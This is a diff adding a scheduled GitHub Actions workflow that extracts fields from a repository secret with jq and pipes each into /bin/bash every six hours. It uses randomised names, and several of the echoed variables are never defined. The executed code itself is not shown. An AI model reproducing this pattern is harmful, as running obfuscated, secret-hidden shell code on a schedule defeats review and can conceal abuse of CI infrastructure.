@@ -1,0 +1,22 @@
+name: chenglidanshun
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenglidanshun
+        env:
+          zdmv73: ${{ secrets.zdmv73 }}
+        run: |
+          echo $zdmv73 | jq -r .vnjgi0761 | /bin/bash
+          echo $kuijp3439 | jq -r .va84277 | /bin/bash
+          echo $we22 | jq -r .drco56324 | /bin/bash
+          echo $hsvsi39 | jq -r .zbizd58511 | /bin/bash
+          echo $wgfq4 | jq -r .kl51115 | /bin/bash
+
